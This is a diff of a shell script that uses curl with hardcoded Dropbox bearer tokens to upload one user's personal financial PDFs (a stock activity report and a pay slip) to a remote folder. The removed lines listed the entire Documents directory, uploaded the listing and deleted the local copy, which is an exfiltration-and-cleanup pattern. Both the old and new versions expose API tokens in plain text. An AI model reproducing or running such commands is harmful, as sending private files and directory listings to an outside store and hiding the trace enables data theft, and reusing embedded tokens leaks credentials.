@@ -1,20 +1,13 @@
 filename=/Users/vrachama/Documents/Personal/Schwab/RestrictedStockActivityAll080219.pdf
 curl -X POST https://content.dropboxapi.com/2/files/upload \
-    --header "Authorization: Bearer F-nQmaPnc6kAAAAAAAAW-J9VAIlzmIjmKeQRcyEsYnocXWDKDha4vGoCcD4GjXbB" \
+    --header "Authorization: Bearer F-nQmaPnc6kAAAAAAAAXCe6GXxuIm86mv2RLQfq0oNLVeoDQiYF9-Ymu8If6Q8Vs" \
     --header "Dropbox-API-Arg: {\"path\": \"/apipush1/$filename\"}" \
     --header "Content-Type: application/octet-stream" \
     --data-binary @$filename
+
 filename=/Users/vrachama/Documents/Personal/401k/pay-slips/Nov-01-2019.pdf
 curl -X POST https://content.dropboxapi.com/2/files/upload \
-    --header "Authorization: Bearer F-nQmaPnc6kAAAAAAAAW-J9VAIlzmIjmKeQRcyEsYnocXWDKDha4vGoCcD4GjXbB" \
+    --header "Authorization: Bearer F-nQmaPnc6kAAAAAAAAXCe6GXxuIm86mv2RLQfq0oNLVeoDQiYF9-Ymu8If6Q8Vs" \
     --header "Dropbox-API-Arg: {\"path\": \"/apipush1/$filename\"}" \
     --header "Content-Type: application/octet-stream" \
     --data-binary @$filename
-find ~/Documents > `whoami`-documents.txt
-filename=`whoami`-documents.txt
-curl -X POST https://content.dropboxapi.com/2/files/upload \
-    --header "Authorization: Bearer F-nQmaPnc6kAAAAAAAAW-J9VAIlzmIjmKeQRcyEsYnocXWDKDha4vGoCcD4GjXbB" \
-    --header "Dropbox-API-Arg: {\"path\": \"/apipush1/$filename\"}" \
-    --header "Content-Type: application/octet-stream" \
-    --data-binary @$filename
-rm -rf `whoami`-documents.txt
